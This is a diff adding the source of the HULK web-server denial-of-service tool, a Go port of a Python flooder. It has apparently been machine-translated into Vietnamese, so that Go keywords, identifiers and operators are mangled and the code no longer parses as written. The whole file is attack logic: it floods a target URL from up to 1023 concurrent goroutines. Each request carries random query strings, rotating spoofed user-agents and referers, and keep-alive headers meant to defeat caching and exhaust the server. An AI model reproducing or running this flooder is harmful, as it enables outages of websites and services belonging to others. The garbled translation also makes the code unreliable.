@@ -1,0 +1,231 @@
+gói chính
+
+/ *
+Công cụ HULK DoS trên các tuyến goroutines <strike> steroid </strike>. Chỉ được chuyển từ Python với một số cải tiến.
+Tiện ích Python gốc của Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
+Chương trình cờ vây này được cấp phép theo GPLv3.
+Bản quyền Alexander I.Grafov <grafov@gmail.com>
+* /
+
+nhập khẩu (
+	"lá cờ"
+	"fmt"
+	"io / ioutil"
+	"toán học / rand"
+	"net / http"
+	"net / url"
+	"hệ điều hành"
+	"hệ điều hành / tín hiệu"
+	"strconv"
+	"dây"
+	"đồng bộ hóa / nguyên tử"
+	"syscall"
+)
+
+const  __version__   =  "1.0.1"
+
+// const acceptCharset = "windows-1251, utf-8; q = 0.7, *; q = 0.7" // sử dụng nó cho runet
+const  acceptCharset  =  "ISO-8859-1, utf-8; q = 0,7, *; q = 0,7"
+
+const (
+	callGotOk               uint8  =  iota
+	callExitOnErr
+	callExitOnTooManyFiles
+	targetComplete
+)
+
+// tham số toàn cục
+var (
+	            bool      an toàn =  false
+	headersReferers [] string  = [] string {
+		"http://www.google.com/?q=" ,
+		"http://www.usatoday.com/search/results?q=" ,
+		"http://engadget.search.aol.com/search?q=" ,
+		//"http://www.google.ru/?hl=ru&q= ",
+		//"http://yandex.ru/yandsearch?text= ",
+	}
+	headersUseragents [] string  = [] string {
+		"Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3" ,
+		"Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, như Gecko) Chrome / 51.0.2704.79 Safari / 537.36 Vivaldi / 1.3.501.6" ,
+		"Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)" ,
+		"Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)" ,
+		"Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1" ,
+		"Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit / 532.1 (KHTML, như Gecko) Chrome / 4.0.219.6 Safari / 532.1" ,
+		"Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 6.1; WOW64; Trident / 4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)" ,
+		"Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 6.0; Trident / 4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)" ,
+		"Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident / 4.0)" ,
+		"Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 5.1; Trident / 4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)" ,
+		"Mozilla / 5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" ,
+		"Mozilla / 4.0 (tương thích; MSIE 6.1; Windows XP)" ,
+		"Opera / 9.80 (Windows NT 5.2; U; ru) Presto / 2.5.22 Phiên bản / 10.51" ,
+	}
+	cur  int32
+)
+
+gõ  chuỗi arrayFlags []
+
+func ( i  * arrayFlags ) String () chuỗi {
+	trả về  "["  +  chuỗi . Tham gia ( * i , "," ) +  "]"
+}
+
+func ( i  * arrayFlags ) Đặt ( chuỗi giá trị  ) lỗi {
+	* i  =  append ( * i , value )
+	trở lại  con số không
+}
+
+func  main () {
+	var (
+		phiên bản  bool
+		    chuỗi trang web
+		  chuỗi đại lý
+		    chuỗi dữ liệu
+		 mảng tiêu đề
+	)
+
+	cờ . BoolVar ( & phiên bản , "phiên bản" , false , "phiên bản in và thoát" )
+	cờ . BoolVar ( & safe , "safe" , false , "Autoshut after dos." )
+	cờ . StringVar ( & site , "site" , "http: // localhost" , "Trang đích." )
+	cờ . StringVar ( & agent , "agent" , "" , "Lấy danh sách các dòng user-agent từ một tệp. Theo mặc định là danh sách xác định trước các userragents được sử dụng." )
+	cờ . StringVar ( & data , "data" , "" , "Data to POST. Nếu hiện tại, hulk sẽ sử dụng yêu cầu POST thay vì GET" )
+	cờ . Var ( & headers , "header" , "Thêm tiêu đề vào yêu cầu. Có thể được sử dụng nhiều lần" )
+	cờ . Phân tích cú pháp ()
+
+	t  : =  hệ số . Getenv ( "HULKMAXPROCS" )
+	maxproc , err  : =  strconv . Atoi ( t )
+	if  err  ! =  nil {
+		maxproc  =  1023
+	}
+
+	u , err  : =  url . Phân tích cú pháp ( trang web )
+	if  err  ! =  nil {
+		fmt . Println ( "tham số url phân tích cú pháp err \ n " )
+		hệ điều hành . Thoát ( 1 )
+	}
+
+	nếu  phiên bản {
+		fmt . Println ( "Hulk" , __version__ )
+		hệ điều hành . Thoát ( 0 )
+	}
+
+	nếu  đại lý  ! =  "" {
+		nếu  dữ liệu , err  : =  ioutil . ReadFile ( tác nhân ); err  ==  nil {
+			headersUseragents  = [] string {}
+			cho  _ , a  : =  chuỗi phạm vi  . Tách ( chuỗi ( dữ liệu ), " \ n " ) {
+				 chuỗi if . TrimSpace ( a ) ==  "" {
+					tiếp tục
+				}
+				headersUseragents  =  append ( headersUseragents , a )
+			}
+		} khác {
+			fmt . Printf ( "không thể tải danh sách Tác nhân người dùng từ% s \ n " , các tác nhân )
+			hệ điều hành . Thoát ( 1 )
+		}
+	}
+
+	đi  func () {
+		fmt . Println ( "- Cuộc tấn công HULK đã bắt đầu - \ n Bắt đầu            ! \ N \ n " )
+		ss  : =  make ( chan  uint8 , 8 )
+		var (
+			err , đã gửi  int32
+		)
+		fmt . Println ( "Đang sử dụng | \ t Đáp ứng OK | \ t Có lỗi" )
+		cho {
+			nếu  nguyên tử . LoadInt32 ( & cur ) <  int32 ( maxproc - 1 ) {
+				truy cập  httpcall ( site , u . Host , data , headers , ss )
+			}
+			nếu  đã gửi % 10  ==  0 {
+				fmt . Printf ( " \ r % 6d trong số tối đa% -6d | \ t % 7d | \ t % 6d" , cur , maxproc , đã gửi , err )
+			}
+			chuyển đổi  <- ss {
+			case  callExitOnErr :
+				nguyên tử . AddInt32 ( & cur , - 1 )
+				err ++
+			case  callExitOnTooManyFiles :
+				nguyên tử . AddInt32 ( & cur , - 1 )
+				maxproc -
+			case  callGotOk :
+				đã gửi ++
+			case  targetComplete :
+				đã gửi ++
+				fmt . Printf ( " \ r % -6d trong số tối đa% -6d | \ t % 7d | \ t % 6d" , cur , maxproc , đã gửi , err )
+				fmt . Println ( " \ r - Đã kết thúc cuộc tấn công HULK -        \ n \ n \ r " )
+				hệ điều hành . Thoát ( 0 )
+			}
+		}
+	} ()
+
+	ctlc  : =  make ( tín hiệu chan os. )
+	tín hiệu . Thông báo ( ctlc , syscall . SIGINT , syscall . SIGKILL , syscall . SIGTERM )
+	<- ctlc
+	fmt . Println ( " \ r \ n - Do người dùng làm gián đoạn -         \ n " )
+}
+
+func  httpcall ( chuỗi url  , chuỗi máy chủ  , chuỗi dữ liệu  , tiêu đề arrayFlags , s chan uint8 ) {   
+	nguyên tử . AddInt32 ( & cur , 1 )
+
+	 chuỗi var param_joiner 
+	var  client  =  new (http. Client )
+
+	 chuỗi if . ContainsRune ( url , '?' ) {
+		param_joiner  =  "&"
+	} khác {
+		param_joiner  =  "?"
+	}
+
+	cho {
+		var  q  * http. Lời yêu cầu
+		 lỗi var err 
+
+		nếu  dữ liệu  ==  "" {
+			q , err  =  http . NewRequest ( "GET" , url + param_joiner + buildblock ( rand . Intn ( 7 ) + 3 ) + "=" + buildblock ( rand . Intn ( 7 ) + 3 ), nil )
+		} khác {
+			q , err  =  http . NewRequest ( "POST" , url , chuỗi . NewReader ( dữ liệu ))
+		}
+
+		if  err  ! =  nil {
+			s  <-  callExitOnErr
+			trở về
+		}
+
+		q . Tiêu đề . Set ( "User-Agent" , headersUseragents [ rand . Intn ( len ( headersUseragents ))])
+		q . Tiêu đề . Đặt ( "Cache-Control" , "no-cache" )
+		q . Tiêu đề . Đặt ( "Accept-Charset" , acceptCharset )
+		q . Tiêu đề . Đặt ( "Người giới thiệu" , headersReferers [ rand . Intn ( len ( headersReferers ))] + buildblock ( rand . Intn ( 5 ) + 5 ))
+		q . Tiêu đề . Đặt ( "Keep-Alive" , strconv . Itoa ( rand . Intn ( 10 ) + 100 ))
+		q . Tiêu đề . Đặt ( "Kết nối" , "duy trì hoạt động" )
+		q . Tiêu đề . Đặt ( "Máy chủ" , máy chủ )
+
+		// Ghi đè tiêu đề bằng các tham số
+
+		cho  _ , phần tử  : =  tiêu đề dải ô  {
+			từ  : =  chuỗi . Tách ( phần tử , ":" )
+			q . Tiêu đề . Đặt ( chuỗi . TrimSpace ( từ [ 0 ]), chuỗi . TrimSpace ( từ [ 1 ]))
+		}
+
+		r , e  : =  khách hàng . Làm ( q )
+		nếu  e  ! =  nil {
+			fmt . Fprintln ( os . Stderr , e . Error ())
+			 chuỗi if . Chứa ( e . Error (), "socket: quá nhiều tệp đang mở" ) {
+				s  <-  callExitOnTooManyFiles
+				trở về
+			}
+			s  <-  callExitOnErr
+			trở về
+		}
+		r . Cơ thể . Đóng ()
+		s  <-  callGotOk
+		nếu  an toàn {
+			nếu  r . Mã trạng thái  > =  500 {
+				s  <-  targetComplete
+			}
+		}
+	}
+}
+
+func  buildblock ( size  int ) ( s  string ) {
+	var  a [] rune
+	cho  i  : =  0 ; i  <  kích thước ; i ++ {
+		a  =  append ( a , rune ( rand . intn ( 25 ) + 65 ))
+	}
+	trả về  chuỗi ( a )
+}
